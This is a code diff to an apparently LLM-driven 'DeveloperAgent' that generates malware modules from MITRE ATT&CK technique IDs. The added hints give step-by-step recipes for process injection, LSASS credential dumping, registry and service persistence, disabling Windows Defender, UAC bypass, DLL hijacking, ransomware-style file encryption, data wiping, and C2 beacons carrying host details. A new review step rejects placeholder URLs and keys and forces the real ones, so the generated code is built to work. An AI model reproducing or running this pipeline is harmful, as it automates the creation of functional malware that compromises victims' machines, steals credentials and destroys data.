@@ -58,123 +58,223 @@ def _safe_name(s: str) -> str:
 MITRE_CODING_HINTS: Dict[str, str] = {
     "T1003.001": (
         "Use ctypes + MiniDumpWriteDump via comsvcs or OpenProcess+MiniDumpWriteDump. "
-        "Requires SeDebugPrivilege — obtain via AdjustTokenPrivileges before access."
+        "Requires SeDebugPrivilege — obtain via AdjustTokenPrivileges before access. "
+        "If privilege escalation fails: log and continue, do NOT raise."
     ),
     "T1055": (
-        "Pattern: VirtualAllocEx → WriteProcessMemory → CreateRemoteThread. "
-        "Use ctypes.windll.kernel32. Handle must have PROCESS_ALL_ACCESS."
+        "NEVER hardcode target PID. NEVER raise uncaught exceptions. "
+        "Step 1: find target using psutil.process_iter(['pid','name']) — "
+        "try in order: 'explorer.exe', 'notepad.exe', 'svchost.exe'. "
+        "If all fail: use ctypes.windll.kernel32.GetCurrentProcess() as fallback, "
+        "set injection_success=False to mark self-injection fallback. "
+        "Step 2: VirtualAllocEx → WriteProcessMemory → CreateRemoteThread. "
+        "PROCESS_ALL_ACCESS = 0x1F0FFF. "
+        "If any step fails: log error, set success=False, return partial result — do NOT raise."
+    ),
+    "T1059.003": (
+        "Use subprocess.run(['cmd.exe', '/c', command], capture_output=True, text=True, timeout=30). "
+        "Or subprocess.Popen(['cmd.exe', '/c', command], stdout=PIPE, stderr=PIPE). "
+        "If returncode != 0: log and continue — NEVER raise."
+    ),
+    "T1543.003": (
+        "Use subprocess.run(['sc', 'create', service_name, 'binPath=', exe_path, 'start=', 'auto'], "
+        "capture_output=True). "
+        "Then subprocess.run(['sc', 'start', service_name]). "
+        "If returncode != 0: log failure, set task_created=False, continue — "
+        "NEVER raise — admin may not be available in sandbox."
+    ),
+   "T1547.001": (
+        "Use winreg.OpenKey(winreg.HKEY_CURRENT_USER, "
+        r"r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE). "
+        "Use winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path). "
+        "Verify by reading back with winreg.QueryValueEx(key, name). "
+        "EXE PATH RULE: use path from intent if provided. "
+        "If NOT provided: prefer sys.executable, otherwise os.path.abspath(sys.argv[0]). "
+        "NEVER hardcode placeholder paths like C:\\Path\\To\\. "
+        "KEY NAME RULE: use key name from intent if provided (e.g. SystemUpdate). "
+        "winreg is a standard Windows built-in and must be used directly. "
+        "If registration fails: log and return registered=False — NEVER raise."
+    ),
+    "T1012": (
+        "Use winreg.OpenKey to read registry values. "
+        "winreg.QueryValueEx(key, value_name) returns (data, type). "
+        "Catch FileNotFoundError for missing keys — NEVER raise uncaught."
+    ),
+    "T1047": (
+        "Use wmi.WMI() client. "
+        "wmi_obj.Win32_Process() for process info, Win32_OperatingSystem() for OS info. "
+        "Catch wmi.x_wmi for connection errors — NEVER raise uncaught."
+    ),
+    "T1518.001": (
+        "Use psutil.process_iter(['name','exe']) to find security processes. "
+        "Check for known AV/EDR names: 'MsMpEng.exe', 'bdagent.exe', 'ccSvcHst.exe'. "
+        "Also check running services via subprocess.run(['sc', 'query'], capture_output=True). "
+        "If fails: return empty list, do NOT raise."
+    ),
+    "T1090": (
+        "Use socket with SOCKS proxy via socks library (PySocks). "
+        "socks.set_default_proxy(socks.SOCKS5, host, port). "
+        "socket.setdefaulttimeout(10). "
+        "If connection fails: log and continue — NEVER raise."
     ),
     "T1056.001": (
         "Use SetWindowsHookEx with WH_KEYBOARD_LL (id=13). "
-        "Requires a message pump (GetMessage loop) in a thread."
-    ),
-    "T1547.001": (
-        "Use winreg.OpenKey(winreg.HKEY_CURRENT_USER, "
-        r"r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE). "
-        "Then winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)."
+        "Requires a message pump (GetMessage loop) in a thread. "
+        "If hook fails: log and return active=False — NEVER raise."
     ),
     "T1053.005": (
         "Use subprocess.run(['schtasks', '/create', '/tn', name, '/tr', path, "
         "'/sc', 'onlogon', '/f'], capture_output=True). "
-        "Check returncode == 0 for success."
+        "If returncode != 0: log failure, set task_created=False — NEVER raise."
     ),
     "T1027": (
         "Use Crypto.Cipher.AES with MODE_CBC. Generate random IV with os.urandom(16). "
-        "Pad plaintext to 16-byte boundary. ALWAYS include iv and key in output dict as hex strings."
+        "Pad plaintext to 16-byte boundary. ALWAYS include iv and key in output dict as hex strings. "
+        "If encryption fails: log and return encoded=False — NEVER raise."
     ),
     "T1140": (
-        "Receive ciphertext, iv, key as hex strings from input_data. "
-        "Convert via bytes.fromhex(). AES-CBC decrypt then unpad. "
-        "NEVER call json.dumps() on a string_json field received as input."
+        "Implement the decode/deobfuscation method specified by the intent. "
+        "If the intent specifies XOR/base64, use the exact XOR key if provided (e.g. 0x41 -> b'\\x41') and then base64-decode. "
+        "If NOT provided: generate a consistent non-trivial key (e.g. b'\\x3f'). "
+        "NEVER use obvious placeholder keys like b'\\xAA'. "
+        "If AES-CBC inputs ciphertext/iv/key are provided, convert with bytes.fromhex() and decrypt then unpad. "
+        "NEVER call json.dumps() on a string_json field received as input. "
+        "If input content is missing: use a minimal fallback payload only to exercise the decode path. "
+        "If decode/decryption fails: log and return decoded=None — NEVER raise."
     ),
     "T1071.001": (
-        "Use requests.post(url, data=payload, timeout=10, verify=False). "
-        "Set Content-Type header. Handle ConnectionError and Timeout explicitly."
+        "Use requests.post(url, json=payload, timeout=10, verify=False). "
+        "Include system info in payload: username, hostname. "
+        "Retry 2-3 times with time.sleep(5) between attempts. "
+        "Handle ConnectionError and Timeout explicitly — NEVER raise uncaught."
     ),
     "T1041": (
         "Use requests.post with encrypted payload as body. "
-        "Return status_code and success bool. timeout=15."
+        "Return status_code and success bool. timeout=15. "
+        "Retry once on failure. If still fails: return success=False — NEVER raise."
     ),
     "T1083": (
         "Use pathlib.Path.rglob('*') filtered by suffix. "
-        "os.walk() is alternative. Catch PermissionError per directory."
+        "os.walk() is alternative. Catch PermissionError per directory — NEVER raise uncaught."
     ),
     "T1082": (
         "Use platform.node(), platform.version(), platform.machine(), "
-        "platform.processor(). Also os.environ for additional info."
+        "platform.processor(). Also os.environ for additional info. "
+        "Always returns data — cannot fail."
     ),
     "T1033": (
         "Use os.getenv('USERNAME') or os.getenv('USER'). "
-        "Fallback: win32api.GetUserName() if pywin32 available."
+        "Fallback: win32api.GetUserName() if pywin32 available. "
+        "If all fail: return username=None — NEVER raise."
     ),
     "T1057": (
         "Use psutil.process_iter(['pid','name','exe','status']). "
-        "Catch psutil.NoSuchProcess and psutil.AccessDenied per process."
+        "Catch psutil.NoSuchProcess and psutil.AccessDenied per process — NEVER raise uncaught."
     ),
     "T1218.011": (
         "subprocess.run(['rundll32.exe', dll_path, entrypoint], "
         "capture_output=True, timeout=30). "
-        "entrypoint is the exported function name."
+        "entrypoint is the exported function name. "
+        "If returncode != 0: log and return success=False — NEVER raise."
     ),
     "T1574.002": (
         "Place malicious DLL in application search path before legitimate DLL. "
-        "Use shutil.copy(src, target_dir). Verify target_dir is in DLL search order."
+        "Use shutil.copy(src, target_dir). "
+        "target_dir = C:\\Users\\Public\\ is always writable without admin. "
+        "DO NOT check if target_dir is in PATH. "
+        "dll_loaded = os.path.exists(os.path.join(target_dir, dll_name)). "
+        "If copy fails: log and return dll_loaded=False — NEVER raise."
     ),
     "T1095": (
         "Use socket.socket(socket.AF_INET, socket.SOCK_STREAM) for raw TCP. "
-        "sock.settimeout(10). send/recv with length-prefixed framing."
+        "sock.settimeout(10). send/recv with length-prefixed framing. "
+        "If connection fails: log and return connected=False — NEVER raise."
     ),
     "T1573.001": (
         "Use ssl.create_default_context() or ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT). "
-        "For self-signed: ctx.check_hostname=False, ctx.verify_mode=ssl.CERT_NONE."
+        "For self-signed: ctx.check_hostname=False, ctx.verify_mode=ssl.CERT_NONE. "
+        "If TLS fails: fallback to plain HTTP, log warning — NEVER raise."
     ),
     "T1105": (
         "Use requests.get(url, stream=True, timeout=30). "
-        "Write chunks: for chunk in r.iter_content(8192): f.write(chunk). "
-        "Verify file exists and size > 0 after download."
+        "Write chunks with iter_content(8192). "
+        "Verify file exists and size > 0 after download. "
+        "If download fails: log and return success=False, downloaded_path='', bytes_written=0 — NEVER raise. "
+        "URL RULE: use URL from intent/goal if provided. "
+        "If NOT provided: generate a realistic private-network or lab URL (e.g. https://192.168.1.100/payload). "
+        "NEVER use example.com, placeholder domains, or localhost unless intent says so."
     ),
     "T1070.004": (
         "Secure delete: overwrite file with os.urandom(file_size) before os.remove(). "
-        "Use multiple passes for sensitive files. Catch FileNotFoundError."
+        "Use multiple passes for sensitive files. Catch FileNotFoundError — NEVER raise uncaught."
     ),
     "T1562.001": (
         "subprocess.run(['sc', 'stop', 'WinDefend'], capture_output=True) then "
         "['sc', 'config', 'WinDefend', 'start=', 'disabled']. "
-        "Alternatively modify registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender."
+        "If returncode != 0: log and continue — NEVER raise. "
+        "Sandbox may deny admin access."
     ),
     "T1005": (
         "pathlib.Path(root).rglob('*') filtered by sensitive extensions "
         "(.docx, .pdf, .xlsx, .txt, .csv, .db, .kdbx). "
-        "Catch PermissionError. Return list of string paths."
+        "Catch PermissionError per directory. Return list of string paths. "
+        "If no files found: return empty list — NEVER raise."
     ),
     "T1113": (
         "Use PIL.ImageGrab.grab() or mss library. "
-        "Save to BytesIO buffer as PNG. Return as base64 string for JSON safety."
+        "Save to BytesIO buffer as PNG. Return as base64 string for JSON safety. "
+        "If capture fails: log and return screenshot=None — NEVER raise."
     ),
     "T1112": (
         "winreg.OpenKey with KEY_SET_VALUE. winreg.SetValueEx for write. "
-        "winreg.DeleteValue for removal. Catch FileNotFoundError for missing keys."
+        "winreg.DeleteValue for removal. Catch FileNotFoundError for missing keys — NEVER raise uncaught."
     ),
     "T1134.001": (
         "Use win32security.OpenProcessToken + win32security.LookupPrivilegeValue. "
-        "AdjustTokenPrivileges to enable SeDebugPrivilege (value=20)."
+        "AdjustTokenPrivileges to enable SeDebugPrivilege (value=20). "
+        "If win32security not available: fallback to "
+        "ctypes.windll.shell32.IsUserAnAdmin() — set has_debug=True if admin. "
+        "If all fail: set has_debug=False, log warning — NEVER raise."
     ),
     "T1548": (
         "Check current elevation: ctypes.windll.shell32.IsUserAnAdmin(). "
-        "UAC bypass: ShellExecute with 'runas' verb or fodhelper technique."
+        "UAC bypass: ShellExecute with 'runas' verb or fodhelper technique. "
+        "If fails: log and return elevated=False — NEVER raise."
     ),
     "T1016": (
         "subprocess.run(['ipconfig', '/all'], capture_output=True, text=True). "
-        "Parse stdout for IP, subnet, gateway, DNS."
+        "Parse stdout for IP, subnet, gateway, DNS. "
+        "If fails: return empty dict — NEVER raise."
     ),
     "T1036.005": (
         "os.rename(current_exe, target_name) or copy to system32 with legit name. "
-        "Use ctypes to set process name if needed."
+        "Use ctypes to set process name if needed. "
+        "If fails: log and return renamed=False — NEVER raise."
     ),
     "T1552.001": (
         "Search common credential file locations: .env, config.ini, web.config. "
         "Use pathlib.Path.rglob with relevant patterns. "
-        "Parse with configparser or regex for password= patterns."
+        "Parse with configparser or regex for password= patterns. "
+        "Catch PermissionError per file — NEVER raise uncaught."
+    ),
+    "T1106": (
+        "Use ctypes.windll.kernel32 for Windows API calls. "
+        "Common calls: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread. "
+        "Use ctypes.c_size_t, ctypes.c_ulong for output parameters. "
+        "Always check return value — 0 means failure. "
+        "If fails: log and return success=False — NEVER raise."
+    ),
+    "T1486": (
+        "Use Crypto.Cipher.AES with MODE_CBC to encrypt files in place. "
+        "Generate random key (os.urandom(32)) and IV (os.urandom(16)). "
+        "Read file → encrypt → write back with .locked extension. "
+        "Store key as hex string in output. "
+        "Catch PermissionError per file — NEVER raise uncaught."
+    ),
+    "T1485": (
+        "Overwrite file contents with os.urandom(os.path.getsize(path)) then os.remove(). "
+        "Multiple passes for sensitive files. "
+        "Catch PermissionError per file — NEVER raise uncaught."
     ),
 }
 
@@ -192,6 +292,7 @@ REQUIRED_PACKAGES: Dict[str, str] = {
     "PIL":           "Pillow",
     "mss":           "mss",
     "requests":      "requests",
+    "socks": "PySocks",
 }
 
 
@@ -214,7 +315,27 @@ def _has_return_in_run(tree: ast.AST) -> bool:
             return any(isinstance(n, ast.Return) for n in ast.walk(node))
     return False
 
+def _extract_expected_from_intent(text: str) -> Dict[str, Any]:
+    """Parse expected literals from intent/goal text."""
+    import re
+    result = {}
+    if not text:
+        return result
 
+    url_match = re.search(r"https?://[^\s,]+", text)
+    if url_match:
+        result["url"] = url_match.group(0).rstrip(".")
+
+    key_match = re.search(r"0x[0-9a-fA-F]+", text)
+    if key_match:
+        result["xor_key"] = key_match.group(0)
+
+    if "cmd.exe" in text.lower():
+        result["needs_cmd"] = True
+    if any(k in text.lower() for k in ["rundll32", "dll execution", "lolbin"]):
+        result["needs_rundll32"] = True
+
+    return result
 # ── Developer Agent ────────────────────────────────────────────────────────────
 
 class DeveloperAgent:
@@ -630,6 +751,70 @@ if __name__ == "__main__":
         return ValidationResult(len(errors) == 0, errors, warnings, metrics)
 
     # ── Main entry ────────────────────────────────────────────────────────────
+    def _review_code(self, code: str, task: Dict, mission_intent: str = "") -> List[str]:
+        issues = []
+        mitre  = task.get("mitre_techniques", [])
+        stage  = task.get("stage", "")
+        ic     = task.get("input_contract")
+
+        intent_text = " ".join([
+            task.get("behavioral_goal", "") or "",
+            task.get("intent", "") or "",
+            mission_intent,
+        ])
+        expected = _extract_expected_from_intent(intent_text)
+        # 1. Exact value check
+        if "url" in expected and expected["url"] not in code:
+            issues.append(f"URL mismatch: must use EXACT URL from intent → {expected['url']}")
+
+        if "xor_key" in expected and expected["xor_key"] not in code:
+            issues.append(f"XOR key mismatch: must use EXACT key from intent → {expected['xor_key']}")
+
+        # 2. Execution requirements
+        if expected.get("needs_cmd") and "cmd.exe" not in code:
+            issues.append("Missing required execution: cmd.exe")
+
+        if expected.get("needs_rundll32") and "rundll32" not in code:
+            issues.append("Missing required execution: rundll32.exe")
+
+        # 3. MITRE obligation check
+        MITRE_REQUIRED = {
+            "T1218.011": ["rundll32"],
+            "T1059.003": ["cmd.exe", "subprocess"],
+            "T1105":     ["requests.get"],
+            "T1547.001": ["winreg"],
+            "T1055":     ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
+            "T1056.001": ["SetWindowsHookEx"],
+            "T1053.005": ["schtasks"],
+            "T1113":     ["ImageGrab", "mss"],
+            "T1095":     ["socket.AF_INET", "SOCK_STREAM"],
+        }
+        code_lower = code.lower()
+        for tid in mitre:
+            apis = MITRE_REQUIRED.get(tid, [])
+            if apis and not any(api.lower() in code_lower for api in apis):
+                issues.append(f"{tid}: missing required API/behavior {apis}")
+
+        # 4. Placeholder detection
+        bad_patterns = [
+            "example.com",
+            "C:\\Path\\To\\",
+            "replace with actual",
+            "Replace with",
+            "0xAA",
+            "b'\\xAA'",
+        ]
+        for pat in bad_patterns:
+            if pat in code:
+                issues.append(f"Placeholder detected: '{pat}'")
+
+        # 5. Independent task gate
+        if ic is None and stage in {"persistence", "discovery"}:
+            if "input_data.get('success')" in code:
+                issues.append("Independent task must NOT gate on input_data success")
+
+        return issues
+
 
     def develop(self, mission_path: str) -> Dict[str, Any]:
         with open(mission_path, encoding="utf-8") as f:
@@ -658,6 +843,11 @@ if __name__ == "__main__":
                     upstream_map[dst][src] = task_map[src]
 
         mid = mission.get("mission_id", "unknown")
+        mission_intent = " ".join([
+            mission.get("original_intent", "") or "",
+            mission.get("normalized_intent", "") or "",
+            mission.get("intent", "") or "",
+        ])
 
         # Per-run folder — mỗi lần gọi develop() có folder riêng
         stamp   = _stamp()
@@ -689,17 +879,48 @@ if __name__ == "__main__":
             for attempt in range(self.max_retry):
                 try:
                     code = self._generate(task, upstream_map[tid], prev_errors or None)
-                    vr   = self._validate(code, task, filepath)
+                    vr = self._validate(code, task, filepath)
 
-                    if vr.valid:
+                    review_issues = self._review_code(code, task, mission_intent)
+                    if review_issues:
+                        print(f"\n    ⚠ Review issues:")
+                        for iss in review_issues:
+                            print(f"      - {iss}")
+
+
+                        intent_text = " ".join([
+                            task.get("behavioral_goal", "") or "",
+                            task.get("intent", "") or "",
+                            mission_intent,
+                        ])
+                        expected = _extract_expected_from_intent(intent_text)
+
+                        prev_errors = ["HARD CONSTRAINTS (must follow exactly, no exceptions):"]
+
+                        if "url" in expected:
+                            prev_errors.append(f"- You MUST use EXACT URL: {expected['url']}")
+                        if "xor_key" in expected:
+                            prev_errors.append(f"- You MUST use EXACT XOR key: {expected['xor_key']}")
+                        if expected.get("needs_rundll32"):
+                            prev_errors.append("- You MUST include execution using rundll32.exe")
+                        if expected.get("needs_cmd"):
+                            prev_errors.append("- You MUST include execution using cmd.exe")
+
+                        prev_errors += [f"- FIX: {iss}" for iss in review_issues]
+                        
+                        if attempt < self.max_retry - 1:
+                            continue
+
+                    if vr.valid and not review_issues:
                         break
 
-                    prev_errors = vr.errors
-                    if attempt < self.max_retry - 1:
-                        print(
-                            f"\n    ↻ retry {attempt+1}: {vr.errors[0][:60]}",
-                            end=" ", flush=True
-                        )
+                    if not review_issues:
+                        prev_errors = vr.errors
+                        if attempt < self.max_retry - 1:
+                            print(
+                                f"\n    ↻ retry {attempt+1}: {vr.errors[0][:60]}",
+                                end=" ", flush=True
+                            )
 
                 except Exception as e:
                     prev_errors = [f"{type(e).__name__}: {str(e)[:80]}"]
